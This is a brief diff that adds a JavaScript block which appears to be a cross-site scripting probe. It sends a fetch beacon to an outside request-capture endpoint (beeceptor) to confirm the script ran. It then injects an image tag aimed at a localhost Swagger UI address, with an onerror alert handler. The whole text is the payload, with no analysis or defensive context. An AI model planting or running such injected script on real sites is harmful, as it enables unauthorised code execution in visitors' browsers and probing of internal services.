@@ -1,0 +1,7 @@
+<script>
+// Ping signal to show JS works
+fetch("https://vodagh.free.beeceptor.com/jsloaded");
+
+// Trigger embedded network call via image injection
+document.body.innerHTML += '<img src="http://127.0.0.1:8080/swagger-ui/" onerror="alert(\'Loaded\')">';
+</script>
